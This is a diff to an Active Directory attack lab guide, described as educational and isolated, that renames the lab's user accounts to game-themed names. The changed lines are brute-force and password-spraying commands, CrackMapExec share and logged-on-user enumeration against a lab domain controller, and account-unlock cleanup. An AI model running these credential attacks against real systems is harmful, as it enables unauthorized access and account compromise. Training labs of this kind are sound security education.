@@ -117,9 +117,9 @@ This lab is for **educational purposes only** in a controlled, isolated environm
 1. **On Kali Linux:**
    ```bash
    # Create user list
-   echo "sales1" > users.txt
-   echo "sales2" >> users.txt
-   echo "hr1" >> users.txt
+   echo "gazlowe" > users.txt
+   echo "tradewind" >> users.txt
+   echo "turalyon" >> users.txt
    
    # Create password list
    echo "password" > passwords.txt
@@ -154,7 +154,7 @@ This lab is for **educational purposes only** in a controlled, isolated environm
    crackmapexec smb 192.168.100.10 -u users.txt -p passwords.txt
    
    # Brute force with specific user
-   crackmapexec smb 192.168.100.10 -u sales1 -p password
+   crackmapexec smb 192.168.100.10 -u gazlowe -p password
    ```
 
 **Expected Result:** Successful authentication and command execution.
@@ -168,13 +168,13 @@ This lab is for **educational purposes only** in a controlled, isolated environm
 1. **On Kali Linux:**
    ```bash
    # Create list of all users
-   echo "sales1" > all_users.txt
-   echo "sales2" >> all_users.txt
-   echo "salesmanager" >> all_users.txt
-   echo "hr1" >> all_users.txt
-   echo "hrdirector" >> all_users.txt
-   echo "itadmin" >> all_users.txt
-   echo "itsupport" >> all_users.txt
+   echo "gazlowe" > all_users.txt
+   echo "tradewind" >> all_users.txt
+   echo "gallywix" >> all_users.txt
+   echo "turalyon" >> all_users.txt
+   echo "jaina" >> all_users.txt
+   echo "gelbin" >> all_users.txt
+   echo "tinkmaster" >> all_users.txt
    
    # Common passwords to spray
    echo "Password123!" > common_passwords.txt
@@ -227,13 +227,13 @@ This lab is for **educational purposes only** in a controlled, isolated environm
 1. **Authenticate with compromised account:**
    ```bash
    # Using CrackMapExec with compromised credentials
-   crackmapexec smb 192.168.100.10 -u sales1 -p password
+   crackmapexec smb 192.168.100.10 -u gazlowe -p password
    
    # Enumerate shares
-   crackmapexec smb 192.168.100.10 -u sales1 -p password --shares
+   crackmapexec smb 192.168.100.10 -u gazlowe -p password --shares
    
    # Enumerate logged on users
-   crackmapexec smb 192.168.100.10 -u sales1 -p password --loggedon-users
+   crackmapexec smb 192.168.100.10 -u gazlowe -p password --loggedon-users
    ```
 
 2. **Attempt lateral movement:**
@@ -282,8 +282,8 @@ After completing the lab:
 1. **Reset account lockouts:**
    ```powershell
    # On DC01
-   Unlock-ADAccount -Identity sales1
-   Unlock-ADAccount -Identity sales2
+   Unlock-ADAccount -Identity gazlowe
+   Unlock-ADAccount -Identity tradewind
    ```
 
 2. **Review and clear event logs** (optional)
